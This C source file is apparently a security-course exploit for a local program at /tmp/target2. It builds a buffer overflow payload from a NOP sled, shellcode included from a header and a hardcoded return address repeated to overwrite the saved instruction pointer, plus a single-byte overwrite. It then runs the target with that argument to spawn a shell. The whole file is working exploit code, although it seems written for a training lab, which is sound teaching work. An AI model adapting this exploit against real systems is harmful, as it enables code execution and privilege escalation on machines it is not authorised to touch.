#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];
  char over[135 + strlen(shellcode)+ 20 + 1];
  int i;

  int shell = strlen(shellcode) + 135;

  // Filling buf with A's (0xbffffcb0)
  for(i = 0; i < 135; i++){
    over[i] = '\x90';
  }

  // Adding Shellcode to buf (0xbffffd50 or d54) 
  for(i; i < shell; i++){
    over[i] = shellcode[i - 135];
  }
  
  // Adding Shellcode address to buf ( 0x804687 eip is going to be this.) 
  for(i; i < shell+20; i+=4){
    over[i] = '\xd0';
    over[i+1] = '\xfc';
    over[i+2] = '\xff';
    over[i+3] = '\xbf';
  }
  
  over[200] = '\x8c';

  args[0] = TARGET; args[1] = over; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env)){
    fprintf(stderr, "execve failed.\n");
  }

  return 0;
}

